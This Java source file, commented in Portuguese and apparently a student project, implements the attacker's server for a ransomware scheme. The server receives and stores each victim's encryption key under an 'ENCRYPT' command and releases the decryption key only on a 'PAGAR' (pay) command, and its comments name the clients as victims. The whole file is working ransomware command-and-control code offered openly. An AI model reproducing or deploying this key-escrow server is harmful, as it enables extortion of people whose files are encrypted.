import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;

/**
 * Classe que representa o servidor/atacante para receber e enviar chaves de encriptação.
 * @author Diogo Matos & Henrique Rosa
 */
public class Server {
    // Armazena as chaves de encriptação associadas aos IPs dos clientes
    private static HashMap<String, String> keyStore = new HashMap<>();

    /**
     * Método principal.
     */
    public static void main(String[] args) {
        int port = 12345;
        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("Servidor iniciado: " + port);
            // Aguarda por uma conexão e cria uma nova thread para lidar com ela
            while (true) {
                Socket clientSocket = serverSocket.accept();
                new ClientHandler(clientSocket).start();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Lida com as operações de cada client/vitima
     */
    private static class ClientHandler extends Thread {
        private Socket clientSocket;

        public ClientHandler(Socket socket) {
            this.clientSocket = socket;
        }

        @Override
        public void run() {
            try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
                 PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {

                // Lê o ID e o comando recebido
                String clientId = in.readLine();
                String command = in.readLine();

                if ("ENCRYPT".equals(command)) {
                    // Se o comando for para encriptar, lê a chave de encriptação e guarda
                    String encryptionKey = in.readLine();
                    keyStore.put(clientId, encryptionKey);
                    System.out.println("Chave recebida e armazenada para " + clientId);
                } else if ("PAGAR".equals(command)) {
                    // Se o comando for para pagar, envia a chave de desencriptação associada ao IP
                    String decryptionKey = keyStore.get(clientId);
                    out.println(decryptionKey);
                    System.out.println("Chave de desencriptação enviada para " + clientId);
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
